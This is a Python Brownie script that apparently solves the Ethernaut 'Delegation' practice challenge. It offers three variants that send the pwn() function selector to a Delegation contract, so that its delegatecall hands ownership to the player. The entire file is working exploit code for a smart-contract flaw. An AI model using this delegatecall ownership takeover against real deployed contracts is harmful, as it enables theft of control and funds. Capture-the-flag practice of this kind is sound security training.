from brownie import Delegate, Delegation,network, config,accounts,web3,Contract

#input the contract address
#> contract.address
contractAddress = '0x64414037BC32600391A3D0B578d07d9530df96DE'
player = accounts.add(config["wallets"]["from_key"])

def solution1():
    delegation = Delegation.at(contractAddress)
    pwnSig = web3.sha3(text="pwn()")
    player.transfer(delegation,data=pwnSig)

def solution2():
    #not sure why this works
    delegate = Delegate.at(contractAddress)
    delegate.pwn({"from":player})

def solution3():
    fromABI = Contract.from_abi("Delegation", contractAddress, Delegate.abi)
    fromABI.pwn({"from":player})

def main():
    solution1()
    